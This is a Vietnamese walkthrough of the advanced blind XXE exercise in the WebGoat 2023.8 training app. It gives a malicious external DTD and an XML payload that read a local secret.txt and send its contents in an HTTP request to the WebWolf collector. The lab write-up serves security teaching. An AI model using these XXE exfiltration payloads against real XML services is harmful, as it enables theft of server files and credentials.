# 1.11 | XXE

> Nguồn: https://tiennhm.io.vn/en/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-11
> Bài viết này sẽ hướng dẫn cách tấn công XXE trên WebGoat 2023.8

Đây là bài tập Blind XXE nâng cao, yêu cầu bạn tạo một file DTD để tải nội dung của tệp `secret.txt` từ server WebGoat lên WebWolf. Dưới đây là hướng dẫn chi tiết để thực hiện bài này.

### **1. Tạo DTD để đọc file và gửi đến WebWolf**
Bạn cần tạo một file **`attack.dtd`** và tải nó lên WebWolf. File này sẽ chứa đoạn mã sau:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "file:////home/webgoat/.webgoat-2023.8//XXE/viquocthuan/secret.txt">
<!ENTITY % send "<!ENTITY send SYSTEM 'http://127.0.0.1:9090/WebWolf/landing?text=%file;'>">
%send;
```

**Giải thích:**
- `%file`: Truy cập nội dung của file `secret.txt` trên máy WebGoat.
- `%send`: Gửi nội dung của file `secret.txt` đến endpoint của WebWolf qua HTTP GET.

### **2. Upload `attack.dtd` lên WebWolf**
- Truy cập WebWolf tại `http://127.0.0.1:9090/WebWolf/home`.
- Trong phần upload, chọn **`attack.dtd`** để tải lên.
- Khi tải lên thành công, WebWolf sẽ hiển thị một đường link trỏ đến file này, ví dụ:
  ```
  http://127.0.0.1:9090/WebWolf/files/username/attack.dtd
  ```

### **3. Gửi XXE Payload trong WebGoat**
Khi gửi request chứa XML, bạn cần sử dụng `attack.dtd` bằng cách chèn vào request như sau:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % external SYSTEM "http://127.0.0.1:9090/WebWolf/files/username/attack.dtd">
  %external;
]>
<comment><text>test &send;</text></comment>
```

**Giải thích:**
- `%external;`: Load file `attack.dtd` từ WebWolf.
- `&send;`: Kích hoạt gửi nội dung file `secret.txt` đến WebWolf.

### **4. Kiểm tra kết quả trên WebWolf**
- Truy cập **WebWolf > Incoming requests**.
- Nếu thành công, bạn sẽ thấy một request chứa nội dung file `secret.txt` trong tham số `text`.

### **5. Gửi nội dung file để hoàn thành bài tập**
- Copy nội dung `secret.txt` mà bạn nhận được từ WebWolf.
- Quay lại WebGoat, post một comment chứa nội dung này để hoàn thành bài tập.

### 📌 **Tóm tắt**
✔ Tạo file `attack.dtd` để đọc file và gửi đến WebWolf.
✔ Upload `attack.dtd` lên WebWolf.
✔ Gửi XML request đến WebGoat để kích hoạt XXE.
✔ Xem nội dung file `secret.txt` trong WebWolf.
✔ Post nội dung để hoàn thành bài tập.

Nếu có lỗi hoặc không thấy nội dung file, kiểm tra lại:
- Đường dẫn file `secret.txt` có chính xác không.
- WebWolf có nhận được request không (kiểm tra log).
- Có chặn firewall nào ngăn chặn request ra ngoài không.
